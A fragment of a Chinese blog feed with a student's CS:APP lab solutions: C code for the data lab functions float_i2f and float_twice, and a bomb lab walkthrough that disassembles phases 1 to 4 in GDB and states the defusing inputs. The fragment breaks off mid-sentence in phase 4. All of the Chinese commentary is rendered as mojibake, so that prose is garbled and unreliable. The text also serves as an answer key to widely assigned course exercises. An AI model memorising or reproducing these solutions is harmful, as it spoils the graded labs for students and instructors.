class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * float_i2f - Return bit-level equivalent of expression (float) x</span><br><span class="hljs-comment"> *   Result is returned as unsigned int, but</span><br><span class="hljs-comment"> *   it is to be interpreted as the bit-level representation of a</span><br><span class="hljs-comment"> *   single-precision floating point values.</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 30</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-title">float_i2f</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>&#123;<br>    <span class="hljs-keyword">unsigned</span> shiftLeft=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">unsigned</span> afterShift, tmp, flag;<br>    <span class="hljs-keyword">unsigned</span> absX=x;<br>    <span class="hljs-keyword">unsigned</span> sign=<span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//special case</span><br>    <span class="hljs-keyword">if</span> (x==<span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-comment">//if x &lt; 0, sign = 1000...,abs_x = -x</span><br>    <span class="hljs-keyword">if</span> (x&lt;<span class="hljs-number">0</span>)<span class="hljs-comment">//å°äº0ï¼Œåˆ™å–å</span><br>    &#123;<br>sign=<span class="hljs-number">0x80000000</span>;<br>absX=-x;<br>    &#125;<br>    afterShift=absX;<br>    <span class="hljs-comment">//count shift_left and after_shift</span><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<span class="hljs-comment">//è®¡ç®—é˜¶ç E=32-shiftLeftï¼Œaftershiftä¿ç•™å°¾æ•°çš„å€¼</span><br>    &#123;<br>tmp=afterShift;<br>afterShift&lt;&lt;=<span class="hljs-number">1</span>;<br>shiftLeft++;<br><span class="hljs-keyword">if</span> (tmp &amp; <span class="hljs-number">0x80000000</span>) <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-comment">//afterShiftçš„å‰23ä½ä¿ç•™ä½œä¸ºå°¾æ•°ï¼Œè¦è€ƒè™‘èˆå…¥</span><br>    <span class="hljs-keyword">if</span> ((afterShift &amp; <span class="hljs-number">0x01ff</span>)&gt;<span class="hljs-number">0x0100</span>)<span class="hljs-comment">//è¿›ä½</span><br>flag=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((afterShift &amp; <span class="hljs-number">0x03ff</span>)==<span class="hljs-number">0x0300</span>)<span class="hljs-comment">//å‘å¶æ•°èˆå…¥</span><br>flag=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">else</span><br>flag=<span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">return</span> sign +((<span class="hljs-number">127</span>+<span class="hljs-number">32</span>-shiftLeft)&lt;&lt;<span class="hljs-number">23</span>) +(afterShift&gt;&gt;<span class="hljs-number">9</span>) + flag;<br>    <span class="hljs-comment">//ç¬¦å·ä½+é˜¶ç +å°¾æ•°+èˆå…¥å€¼</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="15float_twice"><a class="markdownIt-Anchor" href="#15float_twice"></a> 15.float_twice</h2><p>è¿”å›ä¸€ä¸ªæ— ç¬¦å·æµ®ç‚¹æ•°çš„ä¸¤å€</p><p>å¯¹äºéè§„æ ¼åŒ–æ•°ï¼Œå°¾æ•°å·¦ç§»1ä½å°±ç›¸å½“äºä¹˜2</p><p>å¯¹äºè§„æ ¼åŒ–æ•°ï¼Œé˜¶ç åŠ ä¸€å³å¯</p><p>å¯¹äºNaNï¼Œè¿”å›åŸå€¼</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">/* </span><br><span class="hljs-comment"> * float_twice - Return bit-level equivalent of expression 2*f for</span><br><span class="hljs-comment"> *   floating point argument f.</span><br><span class="hljs-comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span><br><span class="hljs-comment"> *   they are to be interpreted as the bit-level representation of</span><br><span class="hljs-comment"> *   single-precision floating point values.</span><br><span class="hljs-comment"> *   When argument is NaN, return argument</span><br><span class="hljs-comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span><br><span class="hljs-comment"> *   Max ops: 30</span><br><span class="hljs-comment"> *   Rating: 4</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-title">float_twice</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> uf)</span> </span>&#123;<br><span class="hljs-keyword">if</span>((uf&amp;<span class="hljs-number">0x7f800000</span>)==<span class="hljs-number">0</span>)  <span class="hljs-comment">//é˜¶ç ä¸º0ï¼Œéè§„æ ¼åŒ–æ•°</span><br>uf=((uf&amp;<span class="hljs-number">0x007fffff</span>)&lt;&lt;<span class="hljs-number">1</span>)|(uf&amp;<span class="hljs-number">0x80000000</span>);<span class="hljs-comment">//å°¾æ•°åŸŸå·¦ç§»ä¸€ä½ï¼Œåˆ«å¿˜äº†ç¬¦å·</span><br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>((uf&amp;<span class="hljs-number">0x7f800000</span>)!=<span class="hljs-number">0x7f800000</span>) <span class="hljs-comment">//ä¸æ˜¯NaN ï¼Œé˜¶ç ä¸æ˜¯å…¨1 </span><br>uf=uf+<span class="hljs-number">0x800000</span>;<span class="hljs-comment">//é˜¶ç +1ï¼Œ2^(1+1)=2*2  </span><br>  <span class="hljs-keyword">return</span> uf;<br><br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="æµ‹è¯•ç»“æœæˆªå›¾"><a class="markdownIt-Anchor" href="#æµ‹è¯•ç»“æœæˆªå›¾"></a> æµ‹è¯•ç»“æœæˆªå›¾</h2><p><img src="/posts/330a79db/image-20210407110327739.png" alt="image-20210407110327739"></p>]]></content>
    
    
    <categories>
      
      <category>è®¡ç®—æœºç³»ç»Ÿ</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è®¡ç®—æœºç³»ç»Ÿ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>lab3_bomblab</title>
    <link href="/posts/2ee63cf/"/>
    <url>/posts/2ee63cf/</url>
    
    <content type="html"><![CDATA[<h1 id="lab3-bomb-lab"><a class="markdownIt-Anchor" href="#lab3-bomb-lab"></a> lab3 bomb lab</h1><h2 id="1-phase_1"><a class="markdownIt-Anchor" href="#1-phase_1"></a> 1. phase_1</h2><ul><li><strong>æ±‡ç¼–ä»£ç ï¼š</strong></li></ul><p><img src="/posts/2ee63cf/image-20210316165036780.png" alt="image-20210316165036780"></p><ul><li><p><strong>æŒ‡ä»¤æ€è·¯:</strong></p><p>å°†åœ°å€$0x402400å­˜åˆ°%esiä¸­</p><p>è°ƒç”¨å‡½æ•°&lt;strings_not_equal&gt;å°†ç”¨æˆ·è¾“å…¥çš„å†…å®¹ä¸å¯„å­˜å™¨%esiä¸­çš„å€¼æ¯”è¾ƒï¼Œç»“æœè¿”å›è‡³%eaxï¼Œè‹¥ç›¸åŒï¼Œåˆ™è¿”å›0ï¼Œåä¹‹è¿”å›1ï¼›</p><p>test  å°†ä¸¤ä¸ªæ•°ç›¸ä¸ï¼Œè‹¥ä¸º0ï¼Œåˆ™ZFæ ‡å¿—ä½å˜ä¸º1ï¼Œåä¹‹ZFä¸º0ï¼›</p><p>è‹¥ZFä¸º1ï¼Œåˆ™jeæŒ‡ä»¤è·³è½¬ï¼Œè·³è¿‡ äº†explode_bombå‡½æ•°ï¼Œç ´è§£æˆåŠŸï¼Œåä¹‹ä¸è·³è½¬ï¼Œçˆ†ç‚¸ã€‚</p></li><li><p><strong>è§£å†³æ–¹æ³•:</strong></p><p>å› æ­¤åœ°å€$0x402400ä¸­å­˜å‚¨çš„å€¼å³ä¸ºæˆ‘ä»¬éœ€è¦çŸ¥é“çš„å¯†ç </p><p>è¿ç”¨GDBè°ƒè¯•å·¥å…·è¾“å…¥æŒ‡ä»¤ :</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">x</span>/s <span class="hljs-number">0</span>x<span class="hljs-number">402400</span><br></code></pre></div></td></tr></table></figure></li></ul><p>å¯å¾—å¯†ç ä¸ºï¼šBorder relations with Canada have never been better.</p><p><img src="/posts/2ee63cf/image-20210315211917616.png" alt="image-20210315211917616"></p><p><img src="/posts/2ee63cf/image-20210316171734306.png" alt="image-20210316171734306"></p><h2 id="2-phase_2"><a class="markdownIt-Anchor" href="#2-phase_2"></a> 2. phase_2</h2><ul><li><p><strong>æ±‡ç¼–ä»£ç ä¸æŒ‡ä»¤æ€è·¯</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">0000000000400efc &lt;phase_2&gt;:<br>  400efc:55                   push   %rbp*å¤‡ä»½<br>  400efd:53                   push   %rbx<br>  400efe:48 83 ec 28          sub    $0x28,%rsp  *å¼€è¾Ÿ40å­—èŠ‚ç©ºé—´<br>  400f02:48 89 e6             mov    %rsp,%rsi*<br>  400f05:e8 52 05 00 00       callq  40145c &lt;read_six_numbers&gt;*è¯»å…¥å…­ä¸ªæ•°å­—ï¼Œé¦–ä¸ªæ•°å­—å­˜æ”¾åœ¨æ ˆé¡¶%rsp<br>  400f0a:83 3c 24 01          cmpl   $0x1,(%rsp)*åˆ¤æ–­a[0]æ˜¯å¦å’Œ1ç›¸ç­‰ï¼Œä¸ç›¸ç­‰ç›´æ¥çˆ†ç‚¸<br>  400f0e:74 20                je     400f30 &lt;phase_2+0x34&gt;*ç›¸ç­‰åˆ™è·³åˆ°$0x400f30<br>  400f10:e8 25 05 00 00       callq  40143a &lt;explode_bomb&gt;<br>  400f15:eb 19                jmp    400f30 &lt;phase_2+0x34&gt;<br>  400f17:8b 43 fc             mov    -0x4(%rbx),%eax*å°†å½“å‰æ•°å­—çš„ä¸Šä¸€ä¸ªæ•°å­—å­˜å…¥%eaxä¸­<br>  400f1a:01 c0                add    %eax,%eax*å°†%eaxå­˜æ”¾çš„å…ƒç´ ä¹˜äºŒ<br>  400f1c:39 03                cmp    %eax,(%rbx)*ä¸å½“å‰æ•°å­—åˆ¤æ–­<br>  400f1e:74 05                je     400f25 &lt;phase_2+0x29&gt;*ç›¸ç­‰åˆ™è·³åˆ°$0x400f25ï¼Œå¦åˆ™çˆ†ç‚¸<br>  400f20:e8 15 05 00 00       callq  40143a &lt;explode_bomb&gt;<br>  400f25:48 83 c3 04          add    $0x4,%rbx*å–ä¸‹ä¸€æ•°å­—<br>  400f29:48 39 eb             cmp    %rbp,%rbx*ä¸æœ€åä¸€ä¸ªå…ƒç´ æ¯”è¾ƒ<br>  400f2c:75 e9                jne    400f17 &lt;phase_2+0x1b&gt;*ä¸ç›¸ç­‰åˆ™å›åˆ°$400f17ï¼Œç»§ç»­ä¹˜äºŒåˆ¤æ–­æ“ä½œ<br>  400f2e:eb 0c                jmp    400f3c &lt;phase_2+0x40&gt;*ç›¸ç­‰åˆ™ç»“æŸï¼Œè·³è½¬è¿›è¡Œæ¸…ç†æ ˆåŒºæ“ä½œ<br>  400f30:48 8d 5c 24 04       lea    0x4(%rsp),%rbx*å°†a[1]åœ°å€èµ‹ç»™%rba<br>  400f35:48 8d 6c 24 18       lea    0x18(%rsp),%rbp*å°†a[5]åœ°å€èµ‹ç»™%rbp,ç”¨ä½œç»ˆæ­¢æ¡ä»¶<br>  400f3a:eb db                jmp    400f17 &lt;phase_2+0x1b&gt;*ç›´æ¥è·³è½¬åˆ°$400f17<br>  400f3c:48 83 c4 28          add    $0x28,%rsp<br>  400f40:5b                   pop    %rbx<br>  400f41:5d                   pop    %rbp<br>  400f42:c3                   retq    <br></code></pre></div></td></tr></table></figure></li><li><p><strong>è§£å†³æ–¹æ³•</strong></p><p>ç”±ä¸Šè¿°æŒ‡ä»¤æ€è·¯å¯çŸ¥ï¼Œç¬¬ä¸€ä¸ªæ•°ä¸º1ï¼Œä¸”ä¹‹åæ¯ä¸ªæ•°éƒ½ä¼šæ˜¯å‰ä¸€ä¸ªçš„ä¸¤å€ï¼Œå¦åˆ™å°±ä¼šçˆ†ç‚¸ã€‚</p><p>æ‰€ä»¥å¯†ç ä¸ºï¼š1 2 4 8 16 32</p><p><img src="/posts/2ee63cf/image-20210316171653420.png" alt="image-20210316171653420"></p></li></ul><h2 id="3-phase_3"><a class="markdownIt-Anchor" href="#3-phase_3"></a> 3. phase_3</h2><ul><li><p><strong>æ±‡ç¼–ä»£ç </strong></p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">0000000000400f43</span> &lt;phase_<span class="hljs-number">3</span>&gt;:<br>  <span class="hljs-attribute">400f43</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> ec <span class="hljs-number">18</span>          sub    $<span class="hljs-number">0</span>x<span class="hljs-number">18</span>,%rsp<br>  <span class="hljs-attribute">400f47</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">4</span>c <span class="hljs-number">24</span> <span class="hljs-number">0</span>c       lea    <span class="hljs-number">0</span>xc(%rsp),%rcx*sscanfç¬¬å››ä¸ªå‚æ•°ï¼Œå³è¾“å…¥çš„ç¬¬äºŒä¸ªæ•°<br>  <span class="hljs-attribute">400f4c</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">54</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>       lea    <span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%rsp),%rdx*sscanfç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œå³è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•°<br>  <span class="hljs-attribute">400f51</span>:be cf <span class="hljs-number">25</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">4025</span>cf,%esi*ç¬¬äºŒä¸ªå‚æ•°<br>  <span class="hljs-attribute">400f56</span>:b<span class="hljs-number">8</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,%eax*ç¬¬ä¸€ä¸ªå‚æ•°<br>  <span class="hljs-attribute">400f5b</span>:e<span class="hljs-number">8</span> <span class="hljs-number">90</span> fc ff ff       callq  <span class="hljs-number">400</span>bf<span class="hljs-number">0</span> &lt;__isoc<span class="hljs-number">99</span>_sscanf@plt&gt;<br>  <span class="hljs-attribute">400f60</span>:<span class="hljs-number">83</span> f<span class="hljs-number">8</span> <span class="hljs-number">01</span>             cmp    $<span class="hljs-number">0</span>x<span class="hljs-number">1</span>,%eax*%eaxä¼šè¿”å›å‚æ•°ä¸ªæ•°<br>  <span class="hljs-attribute">400f63</span>:<span class="hljs-number">7</span>f <span class="hljs-number">05</span>                jg     <span class="hljs-number">400</span>f<span class="hljs-number">6</span>a &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">27</span>&gt;*å¤§äº<span class="hljs-number">1</span>æ‰ç»§ç»­ï¼Œå¦åˆ™çˆ†ç‚¸<br>  <span class="hljs-attribute">400f65</span>:e<span class="hljs-number">8</span> d<span class="hljs-number">0</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-attribute">400f6a</span>:<span class="hljs-number">83</span> <span class="hljs-number">7</span>c <span class="hljs-number">24</span> <span class="hljs-number">08</span> <span class="hljs-number">07</span>       cmpl   $<span class="hljs-number">0</span>x<span class="hljs-number">7</span>,<span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%rsp)<br>  <span class="hljs-attribute">400f6f</span>:<span class="hljs-number">77</span> <span class="hljs-number">3</span>c                ja     <span class="hljs-number">400</span>fad &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">6</span>a&gt;<br>  <span class="hljs-attribute">400f71</span>:<span class="hljs-number">8</span>b <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">08</span>          mov    <span class="hljs-number">0</span>x<span class="hljs-number">8</span>(%rsp),%eax<br>  <span class="hljs-attribute">400f75</span>:ff <span class="hljs-number">24</span> c<span class="hljs-number">5</span> <span class="hljs-number">70</span> <span class="hljs-number">24</span> <span class="hljs-number">40</span> <span class="hljs-number">00</span> jmpq   *<span class="hljs-number">0</span>x<span class="hljs-number">402470</span>(,%rax,<span class="hljs-number">8</span>)<br>  <span class="hljs-attribute">400f7c</span>:b<span class="hljs-number">8</span> cf <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>xcf,%eax<br>  <span class="hljs-attribute">400f81</span>:eb <span class="hljs-number">3</span>b                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400f83</span>:b<span class="hljs-number">8</span> c<span class="hljs-number">3</span> <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">2</span>c<span class="hljs-number">3</span>,%eax<br>  <span class="hljs-attribute">400f88</span>:eb <span class="hljs-number">34</span>                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400f8a</span>:b<span class="hljs-number">8</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">100</span>,%eax<br>  <span class="hljs-attribute">400f8f</span>:eb <span class="hljs-number">2</span>d                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400f91</span>:b<span class="hljs-number">8</span> <span class="hljs-number">85</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">185</span>,%eax<br>  <span class="hljs-attribute">400f96</span>:eb <span class="hljs-number">26</span>                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400f98</span>:b<span class="hljs-number">8</span> ce <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>xce,%eax<br>  <span class="hljs-attribute">400f9d</span>:eb <span class="hljs-number">1</span>f                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400f9f</span>:b<span class="hljs-number">8</span> aa <span class="hljs-number">02</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">2</span>aa,%eax<br>  <span class="hljs-attribute">400fa4</span>:eb <span class="hljs-number">18</span>                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400fa6</span>:b<span class="hljs-number">8</span> <span class="hljs-number">47</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">147</span>,%eax<br>  <span class="hljs-attribute">400fab</span>:eb <span class="hljs-number">11</span>                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400fad</span>:e<span class="hljs-number">8</span> <span class="hljs-number">88</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-attribute">400fb2</span>:b<span class="hljs-number">8</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">0</span>,%eax<br>  <span class="hljs-attribute">400fb7</span>:eb <span class="hljs-number">05</span>                jmp    <span class="hljs-number">400</span>fbe &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">7</span>b&gt;<br>  <span class="hljs-attribute">400fb9</span>:b<span class="hljs-number">8</span> <span class="hljs-number">37</span> <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x<span class="hljs-number">137</span>,%eax<br>  <span class="hljs-attribute">400fbe</span>:<span class="hljs-number">3</span>b <span class="hljs-number">44</span> <span class="hljs-number">24</span> <span class="hljs-number">0</span>c          cmp    <span class="hljs-number">0</span>xc(%rsp),%eax<br>  <span class="hljs-attribute">400fc2</span>:<span class="hljs-number">74</span> <span class="hljs-number">05</span>                je     <span class="hljs-number">400</span>fc<span class="hljs-number">9</span> &lt;phase_<span class="hljs-number">3</span>+<span class="hljs-number">0</span>x<span class="hljs-number">86</span>&gt;<br>  <span class="hljs-attribute">400fc4</span>:e<span class="hljs-number">8</span> <span class="hljs-number">71</span> <span class="hljs-number">04</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       callq  <span class="hljs-number">40143</span>a &lt;explode_bomb&gt;<br>  <span class="hljs-attribute">400fc9</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c<span class="hljs-number">4</span> <span class="hljs-number">18</span>          add    $<span class="hljs-number">0</span>x<span class="hljs-number">18</span>,%rsp<br>  <span class="hljs-attribute">400fcd</span>:c<span class="hljs-number">3</span>                   retq    <br><br></code></pre></div></td></tr></table></figure></li><li><p><strong>æŒ‡ä»¤æ€è·¯ä¸è§£å†³æ–¹æ³•</strong></p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210316175426399.png" alt></p><p>è¿™éƒ¨åˆ†ä»£ç è¯»å…¥å‚æ•°</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210316174708562.png" alt="image-20210316174708562"></p><p>è¿™éƒ¨åˆ†ä»£ç å…ˆåˆ¤æ–­sscanfçš„å‚æ•°ä¸ªæ•°è¿”å›å€¼%eaxæ˜¯å¦å¤§äº1ï¼Œå¤§äºç»§ç»­ï¼Œå¦åˆ™çˆ†ç‚¸</p><p>åœ¨åˆ¤æ–­è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•°å­—æ˜¯å¦å°äº7ï¼Œå°äºç»§ç»­ï¼Œå¦åˆ™çˆ†ç‚¸ã€‚</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210316175205802.png" alt="image-20210316175205802"></p><p>è¿™éƒ¨åˆ†ä»£ç ä¼šè·³è½¬è‡³M[0x402470+%rax*8]æ‰€åœ¨åœ°å€,</p><p>ç”¨gdbæŒ‡ä»¤æŸ¥çœ‹0x402470 å¤„çš„å€¼<img src="/posts/2ee63cf/image-20210316175832024.png" alt="image-20210316175832024"></p><p>é€šè¿‡è§‚å¯Ÿå¯ä»¥å‘ç°ï¼Œjumpä¹‹åçš„æŒ‡ä»¤éƒ½æ˜¯åŠŸèƒ½ç±»ä¼¼çš„é‡å¤æŒ‡ä»¤ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€é€‰æ‹©ä¸€ç»„è·³è½¬å³å¯</p><p>å› ä¸º0x402470 å¤„çš„å€¼å³ä¸ºjmpqåç¬¬ä¸€ä¸ªmovæŒ‡ä»¤æ‰€åœ¨åœ°å€ï¼Œè¯¥æ“ä½œä¼šå°†0xcf(207)èµ‹å€¼ç»™%eaxã€‚å› æ­¤æˆ‘ä»¬å¯ä»¥å–ç¬¬ä¸€ä¸ªæ•°ä¸º0ï¼Œç¬¬äºŒä¸ªæ•°ä¸º207ã€‚å› ä¸ºä¹‹åçš„cmpä¼šæ¯”è¾ƒ%eaxçš„å€¼å’Œæˆ‘ä»¬è¾“å…¥çš„ç¬¬äºŒä¸ªæ•°ï¼Œä¸ç›¸åŒä¼šçˆ†ç‚¸</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210316180239126.png" alt="image-20210316180239126"></p><p>æ•…å¯†ç å¯ä¸ºï¼š0 207æˆ–2 707ç­‰ç­‰ï¼Œç­”æ¡ˆä¸å”¯ä¸€</p><p><img src="/posts/2ee63cf/image-20210316181230534.png" alt="image-20210316181230534"></p><p><img src="/posts/2ee63cf/image-20210316181134846.png" alt="image-20210316181134846"></p></li></ul><h2 id="4-phase_4"><a class="markdownIt-Anchor" href="#4-phase_4"></a> 4. phase_4</h2><ul><li><p><strong>æ±‡ç¼–ä»£ç ï¼š</strong></p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210316204437370.png" alt="image-20210316204437370"></p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/image-20210316204525714.png" alt="image-20210316204525714"></p></li><li><p><strong>æŒ‡ä»¤æ€è·¯å’Œè§£å†³æ–¹æ³•ï¼š</strong></p><p>é¦–å…ˆæˆ‘ä»¬å‘ç°è¿™è¿˜æ˜¯å’Œphase_3ä¸€æ ·ä¼ å…¥2å‚æ•°ï¼Œå¯ä»¥é€šè¿‡æŸ¥çœ‹0x4025cfå¾—çŸ¥ï¼›</p><p>ä¹‹åå°†ç¬¬ä¸€ä¸ªæ•°å­—å’Œ0xeæ¯”è¾ƒï¼Œå¦‚æœå°äºç­‰äºå°±è·³è½¬ï¼Œå¦åˆ™çˆ†ç‚¸ï¼›</p><p>è·³è½¬åæ¥åˆ°movæŒ‡ä»¤ï¼Œèµ‹å€¼åï¼š%edx=0xe,%esi=0x0ï¼Œ%edi=å‚æ•°x<sub>1</sub>;ä¹‹åè°ƒç”¨å‡½æ•°func4()ï¼Œå¯çŸ¥å‰é¢ä¸‰ä¸ªå¯„å­˜å™¨å­˜æ”¾å‡½æ•°func4çš„ä¸‰ä¸ªå‚æ•°ï¼›</p><p>æ¥åˆ°func4é‡Œï¼Œ%eaxç»è¿‡movæŒ‡ä»¤åå˜æˆ0xeï¼Œsubåä¿æŒä¸å˜ï¼Œä¹‹åå°†%eaxçš„å€¼èµ‹ç»™%ecx, shrä¸ºå°†%ecxé€»è¾‘å³ç§»31ä½ï¼Œ%ecx=0;</p><p>saræ— 